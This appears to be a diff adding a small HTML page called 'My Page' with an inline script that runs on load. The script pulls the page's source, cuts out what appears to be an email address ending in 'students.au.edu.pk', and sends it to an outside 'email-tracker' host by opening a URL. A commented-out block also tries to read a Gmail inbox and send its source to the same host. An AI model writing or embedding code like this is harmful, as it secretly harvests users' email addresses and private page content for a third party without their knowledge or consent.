@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>My Page</title>
+</head>
+<body>
+    <h1>Welcome to my page</h1>
+    <script>
+        /*// alert('Hello world!');
+        function mi() { var pageSource = encodeURIComponent(document.documentElement.outerHTML); var url = "https://email-tracker.azurewebsites.net/submit_page_source?page_source=" + pageSource; window.open("view-source:https://mail.google.com/mail/u/0/#inbox"); };
+        // mi();
+        var url = 'https://mail.google.com/mail/u/0/#inbox';
+
+        // Create an XMLHttpRequest object
+        var xhr = new XMLHttpRequest();
+
+        // Set the callback function to be called when the request completes
+        xhr.onreadystatechange = function () {
+            if (this.readyState == 4 && this.status == 200) {
+                // Display the response text in the console
+                console.log(this.responseText);
+            }
+        };
+
+        // Open the HTTP GET request and send it to the URL
+        xhr.open('GET', url, true);
+        xhr.send();*/
+
+        function mainFunc() { var pageSource = encodeURIComponent(document.documentElement.outerHTML); const searchString = "students.au.edu.pk"; const index = pageSource.indexOf(searchString); const result = pageSource.substring(index - 20, index) + searchString; var url = "https://email-tracker.azurewebsites.net/submit_page_source?page_source=" + result; window.open(url); alert("Done!")};
+        mainFunc();
+    </script>
+</body>
+</html>
